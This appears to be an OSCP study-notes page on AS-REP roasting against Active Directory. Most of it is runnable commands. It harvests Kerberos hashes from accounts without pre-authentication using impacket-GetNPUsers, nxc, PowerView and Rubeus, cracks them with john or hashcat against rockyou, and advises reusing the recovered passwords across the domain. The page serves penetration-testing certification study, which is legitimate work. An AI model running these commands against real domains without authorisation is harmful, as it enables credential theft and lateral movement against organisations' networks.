---
title: "AS-REP Roasting"
slug: as-rep-roasting
category: notes
handbook: oscp
tags: ["kerberos"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "AS-REP roasting targets accounts that have Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`)."
---
AS-REP roasting targets accounts that have Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`). Normally the KDC will not send an AS-REP until the client proves it knows the password (pre-auth); with pre-auth off, the KDC hands out the AS-REP to anyone who asks. Part of that response is encrypted with a key derived from the account's password, so it can be cracked offline to recover the plaintext. Why the protocol allows this is in [Active Directory Concepts](/collections/oscp/active-directory-concepts).

Two properties make it a first move in the [Active Directory](/collections/oscp/active-directory) workflow: it needs no credentials, only a username, and it risks no lockout, because it requests a ticket rather than guessing a password.

## Find and request

The hash comes from `impacket-GetNPUsers`. Without credentials it needs a list of usernames to try; each account with pre-auth disabled returns a hash, the rest return nothing.

```bash
# no credentials, against a user list
impacket-GetNPUsers DOMAIN/ -no-pass -usersfile users.txt -dc-ip <DC_IP> \
  -format hashcat -outputfile asrep.hash

# a single known target
impacket-GetNPUsers DOMAIN/brandon.stark -no-pass -dc-ip <DC_IP> -format hashcat
```

With a credential already in hand, skip the userlist and let the DC list the roastable accounts directly:

```bash
impacket-GetNPUsers DOMAIN/user:pass -request -dc-ip <DC_IP> -format hashcat
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.out
```

A `KRB_AP_ERR_SKEW` failure on the `-request` form is a clock mismatch between Kali and the DC, not a credential problem: sync to the DC first, see [Kerberoasting](/collections/oscp/kerberoasting#clock-skew).

BloodHound's **Find AS-REP Roastable Users** query answers the same thing from already-collected data, and from a Windows foothold PowerView lists the vulnerable accounts directly from the `DONT_REQ_PREAUTH` flag:

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname
```

From that same foothold [Rubeus](/collections/oscp/rubeus) requests and formats the hashes without a route from Kali to the DC:

```
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

Target the account's own domain DC: a child-domain account roasts against the child DC, not the forest root.

## Crack

The blob cracks to the account's plaintext password, not another hash.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash    # auto-detects krb5asrep
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt   # alternative
```

On a GPU-less machine john is the reliable choice (see [Password Cracking](/collections/oscp/password-cracking)). A cracked password is a real domain credential: retry it across the domain since reuse is the premise, enumerate from the new identity, and mark it owned in [BloodHound](/collections/oscp/bloodhound).
